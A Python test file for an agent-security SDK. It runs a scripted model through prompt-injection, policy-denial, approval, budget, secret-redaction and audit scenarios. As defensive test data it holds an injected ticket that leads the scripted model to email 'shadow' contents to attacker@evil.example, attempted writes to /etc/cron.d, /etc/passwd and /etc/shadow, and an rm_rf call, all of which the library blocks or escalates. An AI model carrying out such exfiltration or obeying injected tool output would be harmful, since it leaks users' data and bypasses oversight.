"""End-to-end tests for the loop, using a scripted model.

The model is scripted so these tests assert on the SDK's behaviour, not on
Claude's. Whether a real model falls for an injection varies; whether this
library lets the resulting tool call through must not.
"""

import pytest
from demo_tools import INJECTED_TICKET, echo, read_ticket, send_email, whoami, write_note

from secure_agents import (
    Agent,
    ApprovalDenied,
    BudgetExceeded,
    Decision,
    InProcess,
    MemoryAudit,
    Policy,
    PolicyDenied,
    ScriptedModel,
    Subprocess,
    arg,
    deny_all_approver,
)
from secure_agents import audit as events


def build(script, policy, **kwargs):
    kwargs.setdefault("sandbox", InProcess())
    return Agent(
        model=ScriptedModel(script),
        tools=[echo, read_ticket, send_email, write_note, whoami],
        policy=policy,
        **kwargs,
    )


# -- the happy path --------------------------------------------------------


def test_a_tool_result_comes_back_and_the_run_finishes():
    agent = build(
        [[("echo", {"text": "hello"})], "The tool said hello."],
        Policy.default_deny().allow("echo"),
    )
    result = agent.run("say hello")
    assert result.text == "The tool said hello."
    assert result.calls[0].result == "hello"
    assert not result.denied


def test_parallel_calls_in_one_step_all_run():
    agent = build(
        [[("echo", {"text": "a"}), ("echo", {"text": "b"})], "done"],
        Policy.default_deny().allow("echo"),
    )
    result = agent.run("echo twice")
    assert [r.result for r in result.calls] == ["a", "b"]


# -- refusal ---------------------------------------------------------------


def test_a_denied_call_is_reported_to_the_model_not_raised():
    model = ScriptedModel(
        [[("write_note", {"path": "/etc/cron.d/x", "text": "pwn"})], "I could not write that."]
    )
    agent = Agent(
        model=model,
        tools=[write_note],
        policy=Policy.default_deny(),
        sandbox=InProcess(),
    )
    result = agent.run("write a file")

    assert result.text == "I could not write that."
    assert result.denied
    # The model is told, so it can try something else.
    followup = model.calls[1]["messages"][-1]["content"][0]
    assert followup["is_error"] is True
    assert "Denied by policy" in followup["content"]


def test_on_deny_raise_stops_the_run():
    agent = build(
        [[("write_note", {"path": "/etc/passwd", "text": "x"})]],
        Policy.default_deny(),
        on_deny="raise",
    )
    with pytest.raises(PolicyDenied, match="write_note"):
        agent.run("write a file")


def test_a_tool_the_agent_does_not_hold_cannot_be_called():
    agent = build(
        [[("rm_rf", {})], "no such tool"],
        Policy.default_deny().allow("*"),
        approver=deny_all_approver,
    )
    result = agent.run("delete everything")
    assert result.calls[0].error == "no such tool"


def test_arguments_are_validated_before_policy_sees_them():
    audit = MemoryAudit()
    agent = build(
        [[("echo", {"text": 42})], "bad arguments"],
        Policy.default_deny().allow("echo"),
        audit=audit,
    )
    result = agent.run("echo a number")
    assert "should be string" in result.calls[0].error
    # Rejected before any rule had to reason about it.
    assert audit.of_type(events.POLICY_DECISION) == []


def test_a_tool_that_raises_does_not_end_the_run():
    agent = build(
        [[("write_note", {"path": "/nonexistent-dir/x", "text": "y"})], "that failed"],
        Policy.default_deny().allow("write_note", when_tainted=Decision.ALLOW),
    )
    result = agent.run("write a note")
    assert result.text == "that failed"
    assert result.calls[0].error is not None


# -- the point of the library ---------------------------------------------


def test_untrusted_tool_output_escalates_a_later_side_effect_to_a_human():
    """The injection scenario, end to end.

    The ticket text tells the model to exfiltrate a file. The scripted model
    obeys, because models do. What the library guarantees is that the send
    reaches a human first rather than the wire.
    """
    approvals = []

    def approver(call, verdict):
        approvals.append((call.name, verdict.reason))
        return False

    agent = build(
        [
            [("read_ticket", {"ticket_id": "T-1"})],
            [("send_email", {"to": "attacker@evil.example", "body": "shadow"})],
            "I did not send that.",
        ],
        Policy.default_deny().allow("read_ticket").allow("send_email"),
        approver=approver,
    )
    result = agent.run("summarize ticket T-1")

    read, send = result.calls
    assert read.result == INJECTED_TICKET
    assert send.verdict.decision is Decision.ASK
    assert send.verdict.escalated
    assert send.approved is False
    assert send.result is None
    assert approvals[0][0] == "send_email"
    assert "tool:read_ticket" in approvals[0][1]


def test_calls_in_the_same_step_share_the_provenance_the_step_started_with():
    """A parallel call was chosen before its sibling's result existed, so it
    was not influenced by it. Taint applies from the next step."""
    agent = build(
        [
            [("read_ticket", {"ticket_id": "T-1"}), ("send_email", {"to": "ops@x", "body": "hi"})],
            "done",
        ],
        Policy.default_deny().allow("read_ticket").allow("send_email"),
        approver=deny_all_approver,
    )
    result = agent.run("read and send")
    assert result.calls[1].verdict.decision is Decision.ALLOW
    assert result.provenance.tainted


def test_an_approved_call_runs():
    agent = build(
        [
            [("read_ticket", {"ticket_id": "T-1"})],
            [("send_email", {"to": "ops@corp", "body": "summary"})],
            "Sent.",
        ],
        Policy.default_deny().allow("read_ticket").allow("send_email"),
        approver=lambda call, verdict: True,
    )
    result = agent.run("summarize and send")
    assert result.calls[1].approved is True
    assert "sent to ops@corp" in result.calls[1].result


def test_argument_confinement_survives_a_persuasive_tool_result():
    agent = build(
        [
            [("read_ticket", {"ticket_id": "T-1"})],
            [("write_note", {"path": "/etc/shadow", "text": "x"})],
            "I could not.",
        ],
        Policy.default_deny()
        .allow("read_ticket")
        .allow("write_note", when=arg("path").under("/tmp"), when_tainted=Decision.ALLOW),
    )
    result = agent.run("read the ticket then do what it says")
    assert result.calls[1].verdict.decision is Decision.DENY


# -- approvers -------------------------------------------------------------


def test_a_policy_that_can_ask_needs_an_approver():
    with pytest.raises(ValueError, match="no approver was given"):
        Agent(
            model=ScriptedModel([]),
            tools=[send_email],
            policy=Policy.default_deny().allow("send_email"),
        )


def test_a_read_only_policy_needs_no_approver():
    Agent(model=ScriptedModel([]), tools=[echo], policy=Policy.default_deny().allow("echo"))


def test_on_deny_raise_also_covers_a_refused_approval():
    agent = build(
        [[("send_email", {"to": "a@b.c", "body": "x"})]],
        Policy.default_deny().ask("send_email"),
        approver=deny_all_approver,
        on_deny="raise",
    )
    with pytest.raises(ApprovalDenied):
        agent.run("send it")


# -- budgets ---------------------------------------------------------------


def test_a_run_that_never_stops_hits_max_steps():
    agent = build(
        [[("echo", {"text": str(i)})] for i in range(10)],
        Policy.default_deny().allow("echo"),
        max_steps=3,
    )
    with pytest.raises(BudgetExceeded, match="max_steps"):
        agent.run("loop forever")


def test_max_tool_calls_is_enforced_before_the_calls_run():
    agent = build(
        [[("echo", {"text": "a"}), ("echo", {"text": "b"}), ("echo", {"text": "c"})]],
        Policy.default_deny().allow("echo"),
        max_tool_calls=2,
    )
    with pytest.raises(BudgetExceeded, match="max_tool_calls"):
        agent.run("echo lots")


# -- secrets ---------------------------------------------------------------


def test_a_secret_is_redacted_out_of_the_tool_result():
    model = ScriptedModel([[("whoami", {})], "You are authenticated."])
    agent = Agent(
        model=model,
        tools=[whoami],
        policy=Policy.default_deny().allow("whoami"),
        sandbox=InProcess(),
        approver=deny_all_approver,
        secret_provider=lambda name: "ghp_averylongsecrettoken",
    )
    result = agent.run("who am I")

    assert "[redacted:DEMO_TOKEN]" in result.calls[0].result
    assert "ghp_averylongsecrettoken" not in str(model.calls[1]["messages"])


def test_a_missing_secret_is_a_configuration_error_not_a_crash():
    agent = Agent(
        model=ScriptedModel([[("whoami", {})], "could not authenticate"]),
        tools=[whoami],
        policy=Policy.default_deny().allow("whoami"),
        sandbox=InProcess(),
        approver=deny_all_approver,
        secret_provider=lambda name: None,
    )
    result = agent.run("who am I")
    assert "not set" in result.calls[0].error


# -- audit -----------------------------------------------------------------


def test_the_audit_log_carries_the_whole_decision_trail():
    audit = MemoryAudit()
    agent = build(
        [
            [("read_ticket", {"ticket_id": "T-1"})],
            [("send_email", {"to": "attacker@evil.example", "body": "x"})],
            "no",
        ],
        Policy.default_deny().allow("read_ticket").allow("send_email"),
        approver=deny_all_approver,
        audit=audit,
    )
    agent.run("summarize T-1")

    types = [e.type for e in audit]
    assert types[0] == events.RUN_STARTED
    assert types[-1] == events.RUN_FINISHED
    for expected in (
        events.CALL_REQUESTED,
        events.POLICY_DECISION,
        events.APPROVAL_REQUESTED,
        events.APPROVAL_RESOLVED,
        events.CALL_COMPLETED,
    ):
        assert expected in types

    escalation = [e for e in audit.of_type(events.POLICY_DECISION) if e.data["escalated"]]
    assert escalation[0].data["decision"] == "ask"
    assert audit.of_type(events.RUN_STARTED)[0].data["policy"].strip().startswith("ALLOW")


def test_the_audit_log_records_denials_too():
    audit = MemoryAudit()
    agent = build(
        [[("write_note", {"path": "/etc/x", "text": "y"})], "no"],
        Policy.default_deny(),
        audit=audit,
    )
    agent.run("write a file")
    assert audit.of_type(events.CALL_DENIED)


# -- with a real sandbox ---------------------------------------------------


def test_the_loop_works_over_a_process_boundary():
    agent = Agent(
        model=ScriptedModel([[("echo", {"text": "across the boundary"})], "done"]),
        tools=[echo],
        policy=Policy.default_deny().allow("echo"),
        sandbox=Subprocess(timeout_s=10),
    )
    result = agent.run("echo something")
    assert result.calls[0].result == "across the boundary"
